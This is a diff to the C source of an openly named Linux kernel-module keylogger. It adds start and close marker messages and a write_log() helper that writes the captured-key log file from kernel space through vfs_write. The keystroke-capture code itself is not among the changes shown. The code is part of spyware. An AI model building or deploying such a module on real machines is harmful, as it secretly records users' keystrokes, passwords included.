@@ -36,6 +36,8 @@
 #define DEF_LOG_FLAGS O_WRONLY | O_CREAT | O_APPEND
 // #define DEF_LOG_PERMS S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH
 #define DEF_LOG_PERMS S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH
+#define DEF_LOG_INIT_MSG "***INITIALIZING LOG***\n"
+#define DEF_LOG_CLOSE_MSG "***CLOSING LOG***\n"
 
 //////////////
 /* TYPEDEFS */
@@ -44,7 +46,7 @@ typedef struct _myKeyLogger
 {
     struct file *log_fp;
     loff_t logOffset;
-    char keyStr[BUFF_SIZE + 1];
+    unsigned char keyStr[BUFF_SIZE + 1];
 } myKeyLogger, *myKeyLogger_ptr;
 
 /////////////////////////
@@ -58,6 +60,9 @@ static void __exit key_logger_exit(void);
 static struct file* open_log(const char *fileName_ptr, int flags, int rights);
 // PURPOSE - Close a file pointer
 static void close_log(struct file *logFile_fp);
+// PURPOSE - Write data to an open file*
+// RETURN - Number of bytes written on success, -1 on failure
+static int write_log(struct file *logFile_fp, unsigned char *data, unsigned int size, unsigned long long offset);
 // PURPOSE - Translate scan code to 'key' string
 // RETURN - 0 on success, -1 on failure
 static int translate_code(unsigned char scanCode, char *buf);
@@ -76,6 +81,8 @@ static int __init key_logger_init(void)
 {
     int retVal = 0;
     // unsigned char i = 0;  // DEBUGGING
+    int tempRetVal = 0;  // write_log() return value
+    int msgLen = strlen(DEF_LOG_INIT_MSG);  // Length of init message
     
     HARKLE_KINFO(DEVICE_NAME, "Key logger loading");  // DEBUGGING
 
@@ -99,9 +106,8 @@ static int __init key_logger_init(void)
     if (!(myKL.log_fp))
     {
         retVal = -1;
-        HARKLE_KERROR(DEVICE_NAME, key_logger_init, "open_log() Failed");  // DEBUGGING
+        HARKLE_KERROR(DEVICE_NAME, key_logger_init, "open_log() failed");  // DEBUGGING
     }
-    
     else
     {
         HARKLE_KINFO(DEVICE_NAME, "File opened");  // DEBUGGING
@@ -110,6 +116,22 @@ static int __init key_logger_init(void)
         // http://www.ouah.org/mammon_kernel-mode_read_hack.txt
         // myKL.logOffset = myKL.log_fp->f_pos;
         // printk(KERN_INFO "%s: File offset of %s is %ld\n", DEVICE_NAME, DEF_LOG_FILENAME, myKL.logOffset);  // DEBUGGING
+
+        tempRetVal = write_log(myKL.log_fp, DEF_LOG_INIT_MSG, msgLen, myKL.logOffset);
+
+        if (tempRetVal == strlen(DEF_LOG_INIT_MSG))
+        {
+            myKL.logOffset += msgLen;
+        }
+        else if (tempRetVal > 0)
+        {
+            myKL.logOffset += tempRetVal;
+        }
+        else
+        {
+            retVal = -1;
+            HARKLE_KERROR(DEVICE_NAME, key_logger_init, "write_log() failed");  // DEBUGGING
+        }
     }
     
     // DONE
@@ -119,10 +141,30 @@ static int __init key_logger_init(void)
 
 static void __exit key_logger_exit(void)
 {
+    int tempRetVal = 0;  // write_log() return value
+    int msgLen = strlen(DEF_LOG_CLOSE_MSG);
+
     HARKLE_KINFO(DEVICE_NAME, "Key logger unloading");  // DEBUGGING
     // Close Key Logging File
     if (myKL.log_fp)
     {
+        // Log final entry
+        tempRetVal = write_log(myKL.log_fp, DEF_LOG_CLOSE_MSG, msgLen, myKL.logOffset);
+
+        if (tempRetVal == strlen(DEF_LOG_CLOSE_MSG))
+        {
+            myKL.logOffset += msgLen;
+        }
+        else if (tempRetVal > 0)
+        {
+            myKL.logOffset += tempRetVal;
+        }
+        else
+        {
+            HARKLE_KERROR(DEVICE_NAME, key_logger_exit, "write_log() failed");  // DEBUGGING
+        }
+
+        // Close file
         close_log(myKL.log_fp);
         myKL.log_fp = NULL;
         HARKLE_KINFO(DEVICE_NAME, "File closed");  // DEBUGGING
@@ -190,6 +232,47 @@ static void close_log(struct file *logFile_fp)
     }
 
     return;
+}
+
+static int write_log(struct file *logFile_fp, unsigned char *data, unsigned int size, unsigned long long offset)
+{
+    int retVal = 0;
+    mm_segment_t oldfs = get_fs();;
+
+    if (!logFile_fp || !data)
+    {
+        HARKLE_KERROR(DEVICE_NAME, write_log, "NULL Pointer");  // DEBUGGING
+        retVal = -1;
+    }
+    else if (!(*data) || !size)
+    {
+        HARKLE_KERROR(DEVICE_NAME, write_log, "Empty string");  // DEBUGGING
+        retVal = -1;
+    }
+    else
+    {
+        // set_fs(KERNEL_DS);  // I've seen this but...
+        set_fs(get_ds());  // ...the majority wins
+
+        retVal = vfs_write(logFile_fp, data, size, &offset);
+
+        if (retVal != size)
+        {
+            HARKLE_KWARNG(DEVICE_NAME, write_log, "vfs_write() return value did not match data size");
+        }
+        else if (retVal > 0)
+        {
+            printk(KERN_INFO "%s: vfs_write wrote %d bytes\n", DEVICE_NAME, retVal);
+        }
+        else
+        {
+            HARKLE_KFINFO(DEVICE_NAME, write_log, "vfs_write() appears to have failed");
+        }
+
+        set_fs(oldfs);
+    }
+
+    return retVal;
 }
 
 static int translate_code(unsigned char scanCode, char *buf)
